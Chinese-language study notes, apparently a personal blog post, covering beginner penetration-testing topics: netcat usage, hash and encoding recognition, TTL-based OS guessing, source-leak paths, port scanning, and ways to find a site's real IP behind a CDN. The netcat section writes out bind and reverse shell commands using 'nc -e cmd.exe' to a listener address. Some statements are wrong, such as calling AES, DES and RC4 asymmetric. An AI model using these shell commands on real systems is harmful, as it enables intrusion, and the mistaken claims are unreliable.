---
title: web安全day1
date: 2023-12-15 23:47:33
tags:
---

# 1.Nc瑞士军刀使用详解

##          1.tcp监听

```
tcp监听
nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口
nc -l -p 9999
客户端测试
1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口
telnet 10.0.1.161 9999
2、B机器上也可以使用nmap扫描A机器的此端口
nmap 10.0.1.161 -p9999
3、使用nc命令作为客户端工具进行端口探测
nc -vz -w 2 10.0.1.161 9999
（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）
服务端会自动关闭监听。
4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固
在客户端B机器上扫描连续的两个端口，如下
nc -vzw 2 10.0.1.161 9998-9999
```

<!--more-->

## 2.传文件

```
方法1，先启动接收命令
使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了
把A机器上的一个rpm文件发送到B机器上
需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 
步骤1，先在B机器上启动一个接收文件的监听，格式如下
意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）
格式：nc -l port >file
nc -l -p 9995 >zabbix.rpm
步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去
nc 10.0.1.162 9995 < zabbix-release-2.4-1.el6.noarch.rpm
方法2，先启动发送命令
步骤1，先在B机器上，启动发送文件命令
下面命令表示通过本地的9992端口发送test.mv文件
nc -l -p 9992 <test.mv
步骤2，A机器上连接B机器，取接收文件
下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv
nc 10.0.1.162 9992 >test2.mv

```

<!--more-->

## 3.nc反弹shell

```
方法1、REMOTE主机绑定SHELL
在公网监听
nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
或者
nc -l -p 5555 -t -e cmd.exe
在内网主动建立连接
nc -nvv 192.168.153.138 5555
-t是通过telne模式执行 cmd.exe 程序，可以省略。
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
方法2、REMOTE主机绑定SHELL并反向连接
在公网监听
nc -lp 5555
在内网机器反弹
nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
或者
nc -t -e cmd 192.168.153.140 5555
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口

```

# 2.加解密

```md5
md5
 16位和32位 0-9 和a-f 组成的字符串
 
 
 解密：
 1.知道算法
 2.碰撞枚举生成密文
 
 
 
 有特殊情况。md5会加salt一个字符串。

	discuz
```

```sha1
SHA1
和md5特征差不多，只是位数是40
```

```NTLM
NTLM
WINDOWS系统哈希密码，标准通讯安全协议
win7之后使用的密码
之前是LM
```

```
aes，des，rc4
都是非对称加密。印度密钥，密文特质与base64类似
```



大小写敏感

```
base64 通常以=结尾、1-9 a-f
```

```
url 通常以=结尾、1-9 a-f 通常以%数字字母分割 
```

```
编码


gbk，utf-8
```





#### 		 颜文字加密：aaencode

```
jother： +()[]{}
jsfuck是和jother很像。少了{}
```





#### 		图片里包含文件的技术

# 3.判断操作系统

## ttl

```
WINDOWS NT/2000   TTL：128
WINDOWS 95/98     TTL：32
UNIX              TTL：255
LINUX             TTL：64
WIN7          	  TTL：64

```

nmap使用技术可以具体了解判定方法

# 4.数据库判定

​	端口扫描

```
mysql 3306

oracle 1521

sql server 1433

db2 5000
```

# 5.主动打点和被动打点

```
主动式信息打点：主动使用工具、主动发起测试流量等
被动式信息打点：调用接口获取信息等
```

# 6.收集

- ## 操作系统

- ## 脚本语言

- ## 数据库

- ## 源码名称

# 7.泄露原码（cms找不到的情况）

## 	git和svn

```
githack原理
   .git
svnhack原理
   .svn
```

## 	目录备份

```
目录扫描秒了
```

## DsStore

```
mac的上传软件
ds_store
```



## PHP源码泄露

```
java有maven
node.js有npm
php有composer
   composer.json配置文件
 		里面有配置信息。插件。中间件信息

```

## WEB-INF/web.xml

```
web-inf 是java的web应用安全目录，要是想访问文件。必须在web.xml文件对要访问的文件进行映射 
```

# 8.信息收集

github的readme邮箱，版权声明。域名常用搜索。

# 9。端口扫描

1. 网络架构。
2. 内网资产，内网协议
3. 阻碍信息，cdn，waf。负载，防火墙。
4. 端口（1-65535）

```
nmap 协议。端口扫描。防火墙识别
masscan 协议，端口扫描、
```

# 10.端口渗透

# 11.c段/旁注

## 旁注

```
171.40.78.44
www.123.com
www.44.com
www.54454.com
```

## c段

```
然后用ip反查查看绑定域名。可以进去看看资产
同网段渗透
```

# cdn判断

```
超级ping。全国各地ping一下秒了
```

# waf判断

https://www.wangan.com/p/11v71302b8c5ab87

```
工具
 wafw00f
```

## 负载均衡

```
工具：
	lbd
```

# cdn绕过

```
1.子域名查询。有些子域名没有加速cdn
比如你直接访问 www.baidu.com
他如果没买*.baidu.com
那么访问test.baidu.com
      baidu.com都会暴露真实ip
 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做
2.利用网站漏洞暴露真实ip
3.历史dns记录
4.MX
5.国外请求(仅限中国大陆策略下)
	全球cdn查询:tools.ipip.net
	找冷们cdn。他一定不会部署cdn
6.zmap
7.网络空间搜索引擎：
	zoomeye。fofa、shodan
8.部分加速的就可以看网络请求包

```

## 

```
漏洞&遗留文件
	像是有些配置文件。比如phpInfo.php里面就会配置ip地址.从而得知真实ip，适用于没有内网网卡。
```

```
1.传统访问：访问域名->dns->目标主机
2.cdn瑞克派：访问域名->cdn->
3.访问域名->->
4. 主动邮件配合备案
	让对方服务器主动发邮件给你（注册、找回密码等功能）
5.抓APP包: 
	有时候网站使用了CDN，但是可能其APP没有使用，那么通过抓取APP的数据包有可能得出真实的IP地址
6.国外第三方测试CDN网站（结合了几种方法于一身）
	https://get-site-ip.com/
7.查看历史解析IP
	https://site.ip138.com/
	https://viewdns.info/
8.全网扫描FuckCDN(没有办法的办法)
	厂商查询：
		https://tools.ipip.net/cdn.php
    IP库筛地址段
		https://www.cz88.net/geo-public //IP库资源,要下载客户端
	全网扫描：
		https://github.com/Tai7sy/fuckcdn
9.ssrf漏洞
	想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。
	然后通过漏洞·让对方访问你，于是就得到ip'了

```

### 牛逼的工具

​	get-site-ip.com



### 找到cdn后咋办？

```
绑定host文件直接指向真实ip
后期测试测对地方
```



# 正向连接和反向连接 



## **正向连接**

​		

```
正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。
```

## **反向连接**

```
反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。例如，受害主机是一台位于内网，并且没有公网ip且能访问互联网的主机，控制主机无法直接通过ip地址访问到受害主机。所以此时需要在控制主机上监听一个端口，让受害机主动连接控制主机，从而实现对控制主机的控制。

由于正向连接是被攻击者主动连接攻击者，所以不受防火墙策略的限制
```

# 逆向方向

## 代码分析&抓包分析

1. app&&小程序

   1. 收集app里的所有地址，收集所有请求。api

   2. oss阿里云的服务，他又他的客户端。存储资源

      

2. 抓包封包

3. 逆向二进制

4. 反框架检测





# 工具

------



## 内在搜索：



### 	appinfoScanner自动反编译

```
移动端，ios，web，hs。静态网站信息收集工具。基本信息收集，title。dormain。cdn。指纹信息。状态信息，内在提取。反编译收集
```

### 	idea手动反编译内在搜索

### 安卓修改大师

```
可以连接真机去抓包
```

